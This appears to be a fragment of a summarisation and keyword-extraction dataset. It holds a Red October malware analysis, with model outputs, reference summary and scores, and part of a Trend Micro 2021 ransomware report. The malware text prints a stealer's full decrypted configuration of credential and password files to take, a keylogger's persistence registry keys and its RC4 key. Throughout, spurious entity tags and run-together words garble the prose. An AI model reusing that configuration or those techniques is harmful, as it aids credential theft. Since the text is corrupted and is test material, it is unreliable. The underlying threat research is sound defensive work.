-ADMIN MODE\u2014- \u201d or \u201c \u2014 -USER MODE\u2014-\u201c).One more string is added to the log which indicates end of initialization stage and start of main functionality : \u201c WUSB : begin \u201d . This is probably a reference to another module internal name : \u201c WUSB\u201d . Main Procedure It creates an invisible window named \u201c sbw \u201d ( [ORG] Unicode ) with window class \u201c Win32UserHost \u201c . The module calls [PERSON] RegisterDeviceNotification ( ) API to receive systen notifications from particular device [PERSON] GUIDs : F18A0E88 - C30C-11D0 - 881500A0C906BED8 ( GUID_DEVINTERFACE_USB_HUB ) A5DCBF10 - 6530 - 11D2 - 901F00C04FB951ED ( GUID_DEVINTERFACE_USB_DEVICE)So far , the module waits for notifications from [ORG] USB hubs or [ORG] USB devices attached to the local system . According to the notification handler code , the module is only interested in new attached volumes except those which were mapped to letter A : ( reserved for [PERSON] Floppy drives ) . Once the new volume appears in the system the module starts a separate thread to process this event . Device is never processed twice until it is plugged in again , the module stores currently mounted devices and handles device removal events properly . When new [ORG] USB drive is attached , the module obtains USB device software and vendor ID , drive character , volume name , filesystem type , volume serial number , number of free and used bytes . Then it reads the filesystem using direct disk access and own parser of [ORG] FAT - based filesystems . It is unable to read other filesystems including [ORG] NTFS.Own filesystem parser code allows to avoid using system API to access files , and thus bypass various IDS / [ORG] IPS software and at the same time look into slack space of the disk . This lets the attackers reveal already deleted files on removable drives . The module creates additional debug log which traces execution events and records all problems that have occured . The filesystem parser log files are located in % TMP%\\hsperfdata32sys\\bcmntc_rt_*The parser log includes all discovered filenames , including deleted files . The same module is capable of recovering deleted files . It can recognize file types and recover original files depending on format . It is designed to recognize the following file headers : DOCX , XLSX , [ORG] DOC , [ORG] XLS , [ORG] RAR , ZIP . Recovered files are saved in % TMP%\\hdbrt32sys\\ms32jxtr.dat . All files created by the module , including logs are stored in custom binary format , which may use [ORG] Zlib compression , and custom encryption . This module does n\u2019t communicate with any C&c server , all files are stored locally . This is a standalone EXE application module which is used to automatically track and steal interesting files on removable disks attached to infected system . It starts automatically on system boot . [PERSON] Criterias for files are defined in external encrypted binary config file which must be deployed during setup . It creates own database of known files \u2019 hashes and registers a listener for filesystem changes to do that efficiently . Initialization15/21At the start it creates system mutex named [WORK_OF_ART] \u2018 Win32Wbem32Prefetch [WORK_OF_ART] \u2018 , a system event named \u201c [PRODUCT] ScxinWordSid_0129211FA \u201d ( used to signal end of execution ) and a log file at % TMP%\\imapispool 0x.ids . It collects basic system information such as current computer name , current username , and path to original executable module where it started from . This information is put in the log file in the [ORDINAL] first place along with current date and time . Every time module adds anything to the log file , it checks if the log file exceeds [CARDINAL] 15 MB size . If that \u2019s true it deletes current log file and opens a new one using the same path . It changes registry settings to start automatically on system boot . The changes are made to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\winns32comp value . Main Procedure It creates an invisible window named \u201c sbw \u201d with window class \u201c Win32UserHost \u201c . This window receives notifications from specific device types . The module calls [PERSON] RegisterDeviceNotification ( ) API to listen for notification from the system on particular device [PERSON] GUIDs : F18A0E88 - C30C-11D0 - 881500A0C906BED8 ( GUID_DEVINTERFACE_USB_HUB ) A5DCBF10 - 6530 - 11D2 - 901F00C04FB951ED ( [PERSON] GUID_DEVINTERFACE_USB_DEVICE)At the same time it create configs monitoring thread which reacts on file changes and reloads new values . The config files are stored in the same directory where current executable module is and named \u201c imapisync32.dat \u201c , \u201c wmilibrt.dat \u201c . imapisync32.dat is encrypted using some custom algorithm , and has information about file targets to track and copy if found . There are common criterias of file size , file age , etc . The module utilizes [ORG] PCRE ( Perl Compatible Regular Expressions ) library to effectively apply regular expression white and blacklists against filenames . The criterias are splitted into groups and parameters are names with specific prefix of the group ( a , d , s , sd , fa ) . If group is ended with \u201c a \u201d , that is used as a whitelist , filenames that match against such regexps are to be stolen . Groups ending with \u201c d \u201d represent blacklist , files will be ignored . Below is full decrypted config ( imapisync32.dat ) with our comments after \u201c # \u201d character : magic=/lddata/ # magic string identifying config file start _ st_size=/300000000/ [CARDINAL] # max size of the storage ( [CARDINAL] 300 MB ) _ id=/00020/ [CARDINAL] # internal storage i d _ fdeltatime= /2592000/ # files must be not older than 2592000 seconds or [DATE] 30 [DATE] days _ max_size=/20000000/ # maximum size of a single file must be not larger than [CARDINAL] 20 MB _ min_size=/1/ # files must not be smaller than 1 byte a=/\\.txt$/ a=/\\.csv$/ # Comma - Separated [ORG] Values , tabular data file a=/\\.eml$/ # exported e - mail file16/21a=/\\.doc$/ a=/\\.vsd$/ [CARDINAL] # MS Visio document file a=/\\.sxw$/ [CARDINAL] # [ORG] StarOffice / OpenOffice document file a=/\\.odt$/ # [ORG] OpenOffice document file a=/\\.mdb$/ # MS Access database file a=/\\.doc\\./ # * .doc . * files , could be for an archive of MS Word document file a=/\\.odt\\./ # * .odt . * files , could be for an archive of [ORG] OpenOffice document file a=/\\.docx\\./ # etc a=/\\.wab$/ # [WORK_OF_ART] Windows [WORK_OF_ART] Address [WORK_OF_ART] Book file ( used in [ORG] Outlook [ORG] Express ) a=/accounts\\.ini/ # could be [ORG] Opera browser accounts and settings file a=/account\\.cfn/ # TheBat ! e - mail client accounts and settings file a=/signons\\.txt/ # saved user names and passwords in [PRODUCT] Thunderbird , [PRODUCT] Sunbird , and earlier versions of [ORG] Firefox a=/ScribeOptions\\.xml/ [CARDINAL] # probably settings of [NORP] Scribe crossplatform e - mail client a=/wand\\.dat/ [CARDINAL] # [ORG] Opera browser password manager database a=/bpftp\\.dat/ # [ORG] BulletProof FTP client password database a=/sm\\.dat/ # CuteFTP password database a=/smdata\\.dat/ # CuteFTP password database a=/FileZilla\\.xml/ [CARDINAL] # [ORG] FileZilla FTP client password and settings database a=/ftplist\\.txt/ # [ORG] TotalCommander ftp upload file list ( may contain credential information ) a=/addrbk\\.dat/ # TurboFTP password and settings file a=/wcx_ftp\\.ini/ # Total Commander cached [ORG] FTP credentials database a=/ws_ftp\\.ini/ # WS_FTP client password and settings file a=/andrq\\.ini/ # & RQ [ORG] ICQ client password and settings file a=/account\\.xml/ # Very generic name , used in various software a=/odigo\\.com\\.odu/ # [ORG] Odigo instant messenger settings file a=/TheBee\\.ini/ # Some \u201c The Bee \u201d software ini file , unclear which software it is # The following subgroup defines useless files that will not be taken.d=/\\\\~wordspool.*\\.tmp\\.doc$/ d=/\\\\~wordspool.*\\.srt\\.doc$/ d=/\\\\~wordspool.*\\.rtc\\.doc$/_s_fctime= /1990 - 01 - 01 01:02:03/ # files of group \u201c s \u201d after 1990 - 01 - 01 are interesting _ s_max_size=/20000000/ [CARDINAL] # max size for group \u201c s \u201d is [CARDINAL] 20 MB as well _ s_min_size=/1/ [CARDINAL] # min size is [CARDINAL] 1 byte # Some patterns of filenames below seem to be related to some other malware seen on usb drives . It may contain stolen credentials , so they copy it as well.17/21sa=/.*mssysmgr\\.ocx/ sa=/.*\\.cab\\.bak/ sa=/.*list\\.tlb/ sa=/.*drive\\.tlb/ sa=/.+\\\\\\$lddata\\$\\\\.+/ sa=/.+\\\\NT.Config\\\\.+/ sa=/.*\\\\ldupver\\.txt/ [ORG] sa=/\\w:\\\\[\\d\\w]+\\.dll/ [ORG] sa=/\\w:\\\\[\\d\\w]+\\.exe/ sa=/.*autorun\\.inf/ sa=/.*thumb\\.dd/ sa=/.*thumb\\.db/ sa=/.*msnmsngr\\.exe/ sa=/.*svchost\\.exe/ sa=/.*EXPLORER\\.EXE/ sa=/\\.xps/ # This is a subgroup of various files with secrets , such as digital certificates , configs and password databases sa=/\\.acidppr$/18/21sa=/\\.acidssa$/ sa=/\\\\ACIDInstallv.*\\.exe$/ sa=/\\\\ACIDdirInstallv.*\\.exe$/ sa=/\\\\Acid Technologies\\\\/ [CARDINAL] # Probably this and above refers to [PERSON] Acid [PERSON] Cryptofiler military grade encryption software sa=/.*cisco.*\\.txt$/ sa=/.*cisco.*\\.cfg$/ _ f_fctime= /1999 - 02 - 03 02:03:07/ fa=/~WRD32cache.*\\.doc$/ [PERSON] fa=/glxcrt.*\\.dat/ [ORG] fa=/bcmntc.*\\.tmp/ fa=/smrdprev.*\\.tmp/ a=/\\.ttr$/ # maybe [ORG] TTR [ORG] Backup software ? a=/\\.tbe$/ # unclear a=/\\.tte$/ # unclear a=/\\._ok$/ # unclear a=/\\.ki$/ # unclear a=/\\.txr$/ # [ORG] CorelDraw file ? a=/\\.kin$/Config file may change during module work and there is a special thread that monitors config file changes and loads new configuration when it is changed . The module lists all available attached removable drives , iterates through all of them except A : and B : ( reserved for floppy disks ) . It collects full file paths and file meta- information , compresses , encrypts and stores this in % TMP%\\mrtdsync\\win64esrt _ * database . Additionally , files from the list of interest are copied to win64berts * files , which also have full information and body of the file . It is encrypted and compressed twice . There is a separate thread to monitor filesystem changes and every time new file / directory is created or changed on the monitored drives updated information goes to % TMP%\\mrtdsync\\win64esrt _ * in separately spawned thread , additionally all changed or created files are copied to a new win64berts * file . This module works offline and does n\u2019t communicate with any other host on the network . [CARDINAL] 6 . [PERSON] Keyboard group [ORG] Keylogger module ( [PERSON] GMT)2010.10.05 10:53:49 ( [ORG] GMT)2011.05.10 07:44:55 ( [PERSON] GMT)2010.10.05 10:53:49 ( GMT)2010.10.05 10:53:49 ( GMT)2010.10.05 10:53:49 ( GMT)The file is a [ORG] PE [ORG] EXE file , compiled with [ORG] Microsoft [ORG] Visual [ORG] Studio [DATE] 2005 . Its main purpose is to log keystrokes , copy input texts and make screenshots . Main function [ORG] Opens [ORG] and [ORG] Creates [ORG] Event [ORG] WIN_%08X%08X%08X%08X%08X ( SHA1(first [CARDINAL] 512 bytes of self file ) ) , if exists , terminates . Sets in [ORG] AutoRun , using the following registry keys : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \u201c Mspmr32 \u201d = % Path to the module%Deletes file \u201c Keylogger.log \u201d ( this filename is not used anywhere else ) . Registers a window class with RegisterClassEx API using [ORG] ClassName \u201c svchost.exe \u201c , assigns a window procedure that implements main module functionality . Creates window with CreatWindowEx API using [ORG] ClassName \u201c svchost.exe \u201c , window name \u201c svchost \u201d and associates it with a registered class . Registers a device with RegisterRawInputDevices API and associates it with created window with a flag RIDEV_INPUTSINK which enables the caller to receive the input even when the caller is not in the foreground . Window procedure All the logging actions are implemented basing on receiving [ORG] WM_INPUT window message , if raw input for GetRawInputData API comes from keyboard and [ORG] GetRawInputData received [GPE] WM_KEYDOWN message . Collected information It collects some general information about current user and opened windows / processes : [PERSON] Foreground window text or WT_UNKNOWN [PERSON] Module [PERSON] FileName or [GPE] MN_UNKNOWN Foreground window class name20/21UserNameIt is capable of making full desktop screenshots , copying clipboard data of password input fields ( to check a window [ORG] EM_GETPASSWORDCHAR is sent to the window).If \u201c Shift+Insert \u201d , \u201c Ctrl+C \u201d , \u201c \u201d Ctrl+V\u201d,\u201dCtrl+X \u201d , \u201c Ctrl+Insert \u201d is pressed then it copies clipboard data . [PERSON] Creates [PERSON] File [PERSON] % TMP%\\SSDPserv32\\ssdtrbs%08x%.sys.%d% ( % [DATE] 08x \u2013 Random Hex value , % d \u2013 time64 ( ) ) . All the collected information is compressed with [ORG] Zlib and RC4 encrypted with the key \u201c qefwljkfnw3l;fjwe;fklwejfw;eflkwe;flwe\u201dand written to this file.21/21", "generated_text": "Red October; module; Exploits; Dropper; Loader Module; Recon; Password; Email; USB drive; Keyboard; Persistence; Mobile; 2005; C/C++; User; Recon; Passwords; Email; USB drive; USB drive; Keyboard; persistence; Mobile; SP; a mutex; the original exe; the original sections; heaps; memory; the decrypted code; the original sections; the decrypted code; a mutex; SUPER MUTEX; authentication credentials; mail.ru agent software; open; attachments; the Outlook Secure Temp Folder; the executable; the system; network functionality; this module; the passwords; NTFS low level access; deviceIoControl; NTFS; time; the module.", "ref_text": "<START-1>This PDF describes the second stage malware components and capabilities of the Red October cyberespionage campaign. Key points: - The malware has numerous modules that are customized for specific victims and provide a wide range of espionage capabilities. These include modules for stealing credentials, gathering email data, spreading via USB drives, keylogging, persistent access, and exfiltrating data. - Credential theft modules target passwords from email clients, browsers, FTP programs, and more. They dump passwords from registry, configuration files, and protected storage. - Email harvesting modules copy messages and attachments from Outlook and POP3 email. They filter based on attachment types like Office docs, archives, and encryption keys. - USB spreading modules copy files from removable drives based on extensive configuration rules. They recover deleted files and collect a variety of potentially sensitive data. - Keylogging modules log keystrokes, grab clipboard content, and take screenshots. The data is encrypted and saved locally. - Persistence modules maintain access across reboots by adding autorun registry values and restarting malware components. - Exfiltration modules communicate with command and control servers to receive commands and send stolen data. Traffic is encrypted to avoid detection. - In general, the modules work autonomously to collect data, which is later retrieved by the operators. They feature cryptographic protection, anti-analysis measures, and self-removal capabilities. In summary, Red October has highly advanced malware modules tailored for specific espionage operations against selected targets. The modular approach provides flexibility in attacking various systems and gathering desired intelligence. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3691588785046728, "gpt3/lexical/rouge_rouge2": 0.06572769953051642, "gpt3/lexical/rouge_rougeL": 0.19626168224299065, "gpt3/lexical/rouge_rougeLsum": 0.19626168224299065, "gpt3_generated_text": ["The article \u201cRed October\u201d describes a detailed malware attack, including the second stage of the attack. The malware is written in C/C++ and includes modules for various purposes such as Recon, Password, Email, USB drive, Keyboard, Persistence, and Mobile. The malware disrupts basic software breakpoints and some API hooking techniques by decrypting the original executable\u2019s section contents onto heaps in-memory and then writing the decrypted code and data back over the original sections. At its Original Entry Point (OEP), the module retrieves environment information, creates a mutex with the string \u201cSUPER MUTEX\u201d, and attempts to steal authentication credentials from mail.ru agent software and open and saved attachments from the Outlook Secure Temp Folder. The module also steals Mail.Ru Mail Agent account credentials by accessing relevant registry keys and values, logging actions with timestamps, and encrypting them. It attempts to access protected files using NTFS low-level access and uses the DeviceIoControl API function. The module also writes a new string with the current timestamp to indicate that it has finished running. The article provides a comprehensive overview of the malware's capabilities and tactics."]}, {"split_name": "test", "sample_id": "test_19", "prompt_text": "Extract the keywords: Attacks From All Angles2021 Midyear Cybersecurity ReportContents 4 Modern Ransomware Attacks Prompt Multi - State Emergency Responses and Multimillion Dollar Payouts14 APTs [PERSON] Find [PERSON] Exploitable [PERSON] Cracks in Online Portals and Webmail Servers19 A Look at Upgraded Criminal Campaigns and Unexplored Flaws in Unsecured Technology27 Widely Used and [ORG] Vulnerable [ORG] Technology Actively Attacked Through Critical Flaws32 Old Cloud Threats Reemerge to Find New Targets37 Attacks From All Angles Require Multifaceted Defenses39 The Threat Landscape in [ORG] ReviewPublished by [ORG] Trend [ORG] Micro [ORG] ResearchStock image used under license from Shutterstock.comCybercriminals across the board were busy in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , with no signs of slowing down . Within [DATE] the [DATE] last [DATE] six [DATE] months , we saw a ransomware group shut down a major gas provider and leave [CARDINAL] half of the US [LOC] East [LOC] Coast without fuel . Other ransomware operators used double extortion tactics to get [MONEY] million [MONEY] - dollar payouts from enterprises . Advanced persistent threat ( [ORG] APT ) teams compromised integral enterprise tools like [ORG] Amazon [ORG] Web [ORG] Services ( AWS ) cloud servers , [ORG] Kubernetes , and a popular webmail platform in [LOC] Asia , all with different agendas : Some attempted to steal financial account information , while others attempted to load cryptocurrency miners . Critical bugs in major server clients and in popular printer technology were also exploited . Our research into [DATE] the [DATE] first [DATE] few [DATE] months [DATE] of [DATE] the [DATE] year examines dangerous vulnerabilities across different types of devices and operating systems , including the threats targeting these flaws . [CARDINAL] One example of this is our [CARDINAL] three - part investigation into the security of low - powered Long Range Wide Area Network ( LoRaWAN ) technology that is widely used in internet of things ( [ORG] IoT ) configurations around the world . We also analyzed threats aimed at new Mac devices , specifically machines that use ARM64 architecture , as well as vulnerabilities in Windows operating systems and Linux machines . Covid-19 threats continued as well , as pandemic - themed scams began revolving around a much - awaited vaccine and plans about its distribution rather than the disease - focused topics previously seen in [DATE] 2020 . Indeed , though the discovery of the vaccine has created a new sense of optimism , vigilance in securing the cybersecurity threshold remains indispensable . In looking back at the threats that surfaced in [DATE] the [DATE] past [DATE] six [DATE] months , we hope that our midyear report encourages both enterprises and ordinary users to build a better and more effective defense that covers all angles of their security posture . Modern Ransomware Attacks Prompt Multi - State Emergency Responses and Multimillion Dollar PayoutsModern ransomware continues to be a significant threat to enterprises and government organizations . Cybercriminal groups have taken on more sophisticated business models and adopted new technologiesto create efficient and stealthy ransomware attacks . These evolved attacks have certain features thatseparate them from traditional ransomware activities : data exfiltration rather than simple encryption , covert online collaboration , the extended use of affiliate programs , and [ORG] APT - like victim targeting , amongothers.1Most notably , in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] the [DATE] year we saw modern ransomware actors successfully extortingcompanies and extracting valuable enterprise data using a double extortion technique : On top ofdemanding ransom in exchange for decrypting data , attackers placed increased duress on their victimsby threatening to release their private data on a leak site . Enterprises that hold valuable intellectualproperty will view this as a serious concern , as data leaks come with regulatory penalties , lawsuits , andreputational damage . We also saw the rise of triple distributed denial - of - service ( DDoS ) attacks andquadruple extortion models to harass customers and increase their possibility of payment . We researched the ransomware - as - a - service ( RaaS ) sites of [CARDINAL] 16 ransomware actors2 and investigated howthese actors extort money from their victims . Some keep terabytes of stolen data online for over a yearand threaten to leak increasing amounts of data over time , though most keep stolen data publicly availablefor [DATE] several [DATE] months . Some of these data leak sites are on Tor - hidden servers , while others are hosted usingbulletproof hosting . RaaS actors also use commercially available and free file - sharing platforms , or evenhost files on websites on the clear web.4 | Attacks From All Angles : 2021 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportHow [ORG] Active Were Ransomware Actors in [DATE] the [DATE] First [DATE] Half of [CARDINAL] 2021?Our data shows that [CARDINAL] over [CARDINAL] 7.3 [CARDINAL] million ransomware threats were detected in [DATE] the [DATE] first [DATE] six [DATE] months [DATE] of [DATE] 2021,which is [CARDINAL] almost [CARDINAL] half the number of detections we found in the same period in [DATE] 2020 . There are severalfactors that might have contributed to this decrease . [ORDINAL] First , it signals the shift to the more targeted modernransomware3 that we have been analyzing , which involves attackers moving from the less effective , quantity - focused model of ransomware to big - game hunting . We can also attribute this decrease to animprovement in the detection and blocking capabilities of security solutions . Threats were stopped andblocked before they even reached users , and so detections also dropped . It \u2019s important to note thatmodern ransomware uses phishing and exploits as the [ORDINAL] first step in the infection process , so when securitysolutions block this initial intrusion , the deployment of ransomware is prevented . Furthermore , an incidentwith the [PRODUCT] DarkSide ransomware brought heightened attention to ransomware operators , which might haveprompted some of them to lie low . Meanwhile , law enforcement agencies across the world conducteda series of ransomware operations takedowns that might have left an impact on wide - reaching activegroups . The [ORG] WannaCry and [GPE] Locky families made up most of the detection count , continuing the trend we saw inour [DATE] 2020 [DATE] Annual Roundup.4 [ORG] WannaCry is a familiar threat that started plaguing enterprises and users since2017 ; however , [DATE] this [DATE] year , there was a marked decrease in [ORG] WannaCry detection numbers . The longevity ofthis family shows how long a network worm can persist if devices are not patched properly , even whenthe actors are not maintaining the attack . Meanwhile , DarkSide , [GPE] Nefilim , and [PERSON] Conti are also among the top [CARDINAL] 10 families detected in this period andstand out significantly in terms of attack scope , tools , and techniques . In terms of targeted industries , ransomware actors focused on many of the same sectors as [DATE] last [DATE] year . The most affected organizations were in banking , government , and manufacturing . We saw a surge inransomware attempts on banking groups , although RaaS is opportunistic with regard to its targeting style . This means that attackers are not likely singling out banking businesses in particular.5 | Attacks From All Angles : 2021 [ORG] Midyear [ORG] Cybersecurity [ORG] ReportEmail ( [CARDINAL] TOTAL)URLFile ( TOTAL)1,375,39405,453,2436,284,7872,898,7483,079,6432,856,8222020 1H2021 1H8MFigure 1 . A [DATE] half [DATE] - [DATE] year comparison of total detected ransomware [DATE] monthly threats by layerPremodern [ORG] RansomwareModern [ORG] RansomwareFirst component of attackLast component of attackRansomware dropped via emailand malicious URLsPhishing and exploits are entryvectors and ransomware is directly installed in network . Figure [CARDINAL] 2 . The differences in modern and premodern ransomware6 | Attacks From All Angles : 2021 Midyear Cybersecurity Report1H 20201H 2021WCRY109,838WCRY61,026LOCKY6,967CERBER2,365CRYSIS1,100LOCKY7,920CERBER2,945SODINOKIBI2,119SODINOKIBI929GANDCRAB1,433GANDCRAB908RYUK869RYUK864DARKSIDE830CRYPWALL446CRYPWALL743BITPAYMER428CRYPREN415Others29,059NEFILIM692CONTI610Others51,4430120K080KFigure 3 . File - only count of ransomware family detections in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2020 comparedto the first [CARDINAL] half of 2021Source : Trend Micro \u2122 Smart Protection Network \u2122 infrastructureGovernmentHealthcareManufacturingFinancialEducationWCRY15,794WCRY [CARDINAL] 8,652WCRY [CARDINAL] 7,576WCRY [DATE] 2,455GANDCRAB77CERBER69CRYSIS131SODINOKIBI77MOUNTLOCKER71LOCKY37SODINOKIBI66ZEPPELIN20WCRY [DATE] 1,789CERBER186LOCKY4220K020K020K020K020KBankingGovernmentManufacturingHealthcareFood and beverageWCRY15,207WCRY [CARDINAL] 9,319WCRY 3,141WCRY 2,959GANDCRAB20LOCKY34CRYPCTB61SODINOKIBI192MOUNTLOCKER18GANDCRAB22CONTI51ZEPPELIN112WCRY 216CERBER108LOCKY10820K020K020K020K020K0 200Figure 4 . The top [CARDINAL] three malware families that affected the top [CARDINAL] five industriesin [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2020 and [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 20217 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportThe Nefilim ransomware continued to target companies with [MONEY] billion [MONEY] - dollar yearly revenues , a tactic that weanalyzed as the model for modern ransomware.5 In [DATE] May , the [ORG] DarkSide6 ransomware shut down [ORG] ColonialPipeline , a company responsible for providing fuel to [CARDINAL] nearly [CARDINAL] half the US [LOC] East [LOC] Coast . As a result , [ORG] theFederal [ORG] Motor [ORG] Carrier [ORG] Safety [ORG] Administration ( FMCSA ) had to declare a state of emergency in [CARDINAL] 18 statesto help with the shortages . The incident was so considerable that it spawned a group that posed7 asDarkSide and sent extortionist emails to companies \u2019 generic email addresses . There was also DarkSideLinux,8 another version of the ransomware that targets files related to virtual machines ( VMs ) on VMwareESXI servers . It kills VMs , encrypts files on the infected machine , collects system information , and sendsit to a remote server . Meanwhile , [PERSON] Conti9 is known as the successor to the popular [ORG] Ryuk ransomware family , with its threat actors victimizing targets using the same methods used with [ORG] Ryuk . In fact , [ORG] Trickbot , [ORG] Emotet , and [PRODUCT] BazarLoader are now used to distribute [PERSON] Conti . In the succeeding sections , we discuss these families , as well as other ransomware attacks anddevelopments that were significant in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 . The tactics and tools used to conduct thesemalicious activities show how ransomware has evolved over [DATE] the [DATE] years . How Did Modern Ransomware Spread in [DATE] the [DATE] First [DATE] Half [DATE] of [DATE] 2021?Modern ransomware attackers are now becoming more mature by using [ORG] APT - level tools and techniquesto access and move deeper into the victim \u2019s system , exfiltrate data , and then deliver their payloads . InMay 2021 , we saw that [ORG] the [ORG] Microsoft [ORG] Exchange [ORG] Server vulnerability called ProxyLogon,10 discovered in2020 , was used to deliver [CARDINAL] three types of malware , including the [ORG] BlackKingdom ransomware . [CARDINAL] One otherexample is the aforementioned ransomware [LANGUAGE] Conti,11 which targeted Ireland \u2019s [ORG] Department [ORG] of [ORG] Health inMay.12 Conti has been seen compromising victims through firewall vulnerabilities CVE-2018 - 13379 andCVE-2018 - 13374 , which are more sophisticated entry points than traditional ransomware . After exploitingthe vulnerable firewall , the ransomware tries to move laterally within the system . REvil or [GPE] Sodinokibi13 was yet another modern ransomware that was active throughout [DATE] 2021 , specificallytargeting tech company [ORG] Acer in [DATE] March , [ORG] Apple in [DATE] April , and the world \u2019s largest meat processor , [ORG] JBS , inJune.14 This family also used techniques that indicate a targeted approach . For example , it used the remotecode execution ( RCE ) CVE-2019 - [DATE] 2725 vulnerability , and we observed that it was loaded in the memoryof [ORG] PowerShell through reflective - load instead of binary execution . The Hello ransomware,15 which uses.hello as its extension , arrives at a target system via [ORG] Microsoft [ORG] SharePoint vulnerability CVE-2019 - 0604.Our analysis revealed that after the exploit is abused for intrusion , [ORG] the [ORG] China [ORG] Chopper web shell ( detectedby [ORG] Trend [ORG] Micro as Backdoor . ASP.WEBSHELL.SMYAAIAS ) is deployed to execute [ORG] PowerShell commandsto facilitate the succeeding malicious actions and ultimately push the payload.8 | Attacks From All Angles : 2021 Midyear Cybersecurity ReportSophisticated methods of accessing and entering an organization sometimes come from a source outsidethe group that actually creates or distributes the ransomware . This is where affiliate programs come in . These programs , which flourished in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2021 , are basically collaborations that allow actorsto share their tools , such as customizable software , new and readily available technologies for improvedvictim - targeting , and more . Specifically , we saw many actors with access to compromised assets ( suchas avenues into a victim \u2019s network ) collaborate with other actors who hold ransomware . Nevertheless , while this means that certain cybercriminals can take advantage of other groups \u2019 tools and resources , there are downsides to this option . For example , the high - profile DarkSide attacks in [DATE] May had multiple victims apart from [ORG] Colonial [ORG] Pipeline , and it was reported that there were different affiliate groups behind the attacks . This is one of the issuesthat arise with affiliate programs : The ransomware group does not have oversight into the victims ofits partners . For its part , the [PRODUCT] DarkSide group apologized16 and said that it will target less controversialorganizations in the future , adding that it will start checking companies that its partners want to targetand encrypt . It should be noted that these ransomware also use traditional means to gain initial access into a victim\u2019ssystem : malspam emails with spear - phishing links or attachments , remote desktop protocol ( RDP ) accessthat uses valid accounts , compromised websites , and others . How Was Data Exfiltrated in [CARDINAL] 2021?After initial access , lateral movement within a victim\u2019sPredictionssystem is a key phase in the modern ransomwareprocess . [ORG] Groups use this movement either toidentify valuable data within the victim organizationfor exfiltration , or to drop malicious payloads . In thecase of most modern ransomware , after gaining initialaccess , additional tools are downloaded . Nefilim , [PERSON] Conti , and Hello all use Cobalt Strike beacons . [ORG] Theyare typically used to establish a remote connectionto the environment , tag valuable data , and executeIn our security predictions [DATE] last [DATE] year , we speculated that there would be an increase in sophisticated attacker groups relying on penetration testing tools . We also predicted that [PERSON] Cobalt [PERSON] Strike , the source code for which was allegedly leaked in [DATE] the [DATE] second [DATE] half [DATE] of [DATE] 2020 , would be among these tools.commands . We observed that [GPE] Sodinokibi uses RDP and [ORG] PsExec for lateral movement , dropping andexecuting other components and the ransomware itself . Conti operators also remotely create thescheduled tasks of the payload ( which can include [PERSON] Cobalt [PERSON] Strike , [GPE] KillAV scripts , and [PERSON] Conti ) that can beremotely executed using scheduled tasks and batch files.9 | Attacks From All Angles : 2021 Midyear [ORG] Cybersecurity [ORG] ReportData exfiltration and extortion tactics differ from the various ransomware families we saw in [DATE] 2021.Typically , however , the data is used in double extortion schemes \u2014 the ransomware actors post thestolen information from non - paying victims on data leak sites as a way of pressuring them further intopaying the ransom . These data leak sites are on public file - sharing platforms and sometimes on the clearweb . We also noted that the exfiltration tools used by ransomware groups are usually open - source , freepublic resources . For example , we found that [PERSON] Conti operators use the cloud storage synchronization tool Rclone to uploadfiles to the Mega cloud storage service . Similarly , DarkSide operators use Mega client for exfiltrating filesto cloud storage , 7 - Zip for archiving , and PuTTY application for network file transfers . After data is exfiltrated , the payload is dropped . Many modern ransomware actors take over networksin multiple human - supervised stages , unlike with traditional attacks that use click - on - the - link automaticevents . They spend [DATE] weeks or even [DATE] months conquering different parts of the victim \u2019s network beforethey execute the ransomware payload . This is another feature that makes modern ransomware attacksseem like nation - state [ORG] APT attacks . [CARDINAL] One example of this is the [GPE] Nefilim17 ransomware , which stays silentlyworking in the victim \u2019s network for [DATE] weeks to fully exfiltrate the data before executing the ransomwarepayload . How Were Legitimate Tools Misused by [PERSON] Ransomware [PERSON] Gangs?We mentioned previously that ransomware distributors sometimes use legitimate tools to performmalicious activities , but the scope of misuse is worth exploring further . On their own , most of the toolsexploited by ransomware are used to help in security research or to improve efficiency . Many of them areopen - source and can be used and modified by the public freely . Conversely , the features that make themgood tools also make them useful for cybercriminals.18ToolIntended useHow it is used forransomware campaignsRansomware campaignsthat used this toolCobalt StrikeThreat emulationLateral movement , backdoorHas many other capabilities as a remote access trojan ( RAT)PsExecMimikatzExecuting processes on other systemsArbitrary command shell execution , lateral movementProof - of - concept code for demonstrating vulnerabilitiesCredential dumpingClop , [PERSON] Conti , [ORG] DoppelPaymer , Egregor , Hello ( WickrMe ) , [GPE] Nefilim , [ORG] NetWalker , [ORG] ProLock , [ORG] RansomExx , RyukDoppelPaymer , [GPE] Nefilim , [ORG] NetWalker , [GPE] Maze , [GPE] Petya , [ORG] ProLock , [ORG] Ryuk , [GPE] SodinokibiDoppelPaymer , [GPE] Nefilim , [ORG] NetWalker , [ORG] Maze , [GPE] ProLock , [ORG] RansomExx , [NORP] Sodinokibi10 | Attacks From All Angles : 2021 [ORG] Midyear [ORG] Cybersecurity ReportToolIntended useHow it is used forransomware campaignsRansomware campaignsthat used this toolProcess Hacker Monitoring system resources , debug software , and detect malwareAdFindActive Directory ( AD ) search utilityMegaSyncCloud - based synchronizationProcess / service discovery and termination ( including antimalware solutions)AD discovery ( can be a prerequisite for lateral movement)Crysis , Nefilim , [ORG] SodinokibiNefilim , [ORG] NetWalker , [ORG] ProLock , [ORG] SodinokibiData [ORG] exfiltrationHades , [ORG] LockBit , NefilimTable 1 . [CARDINAL] Six commonly weaponized legitimate toolsSome ransomware groups use multiple tools at once in various stages of their attack . For example , [PERSON] Nefilimuses [PERSON] AdFind , [PERSON] Cobalt [PERSON] Strike , [PERSON] Mimikatz , [PERSON] Process [PERSON] Hacker , [ORG] PsExec , and [ORG] MegaSync . Primarily , ransomwareoperators opt for these tools for evasion . Since these tools are recognized as legitimate , they might beable to conduct malicious activity while remaining undetected by simple security software . Additionally , since they are open - source , criminals can alter their code to tweak certain parts that trigger antimalwaresoftware . 